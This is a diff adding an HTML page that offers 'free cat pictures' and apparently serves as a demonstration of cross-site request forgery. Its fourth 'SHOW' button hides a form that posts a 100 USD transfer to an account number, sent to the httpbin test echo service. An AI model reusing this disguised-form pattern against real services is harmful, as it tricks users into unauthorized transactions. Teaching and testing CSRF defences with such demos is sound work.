@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>FREE CAT PICTURES</title>
+    <style>
+      * {
+        box-sizing: border-box;
+      }
+
+      form {
+        padding: 16px;
+      }
+
+      form:nth-of-type(even) {
+        background-color: gainsboro;
+      }
+
+      form button {
+        position: absolute;
+        left: 128px;
+      }
+    </style>
+  </head>
+  <body>
+    <section>
+      <h1>Free cat pictures!!!!!</h1>
+      <form action="/" method="get">
+        <input type="hidden" name="cat" value="munchkin" />
+        <label>Munchkin.png</label>
+        <button type="submit">SHOW</button>
+      </form>
+      <form action="/" method="get">
+        <input type="hidden" name="cat" value="british" />
+        <label>British.png</label>
+        <button type="submit">SHOW</button>
+      </form>
+      <form action="/" method="get">
+        <input type="hidden" name="cat" value="angora" />
+        <label>Angora.png</label>
+        <button type="submit">SHOW</button>
+      </form>
+      <form action="http://httpbin.org/post" method="post">
+        <input type="hidden" name="action" value="transfer" />
+        <input
+          type="hidden"
+          name="recipient"
+          value="PL53133130106195556453858938"
+        />
+        <input type="hidden" name="amount" value="100" />
+        <input type="hidden" name="currency" value="USD" />
+        <label>Minskin.png</label>
+        <button type="submit">SHOW</button>
+      </form>
+    </section>
+    <section>
+      <img id="image" />
+    </section>
+  </body>
+</html>
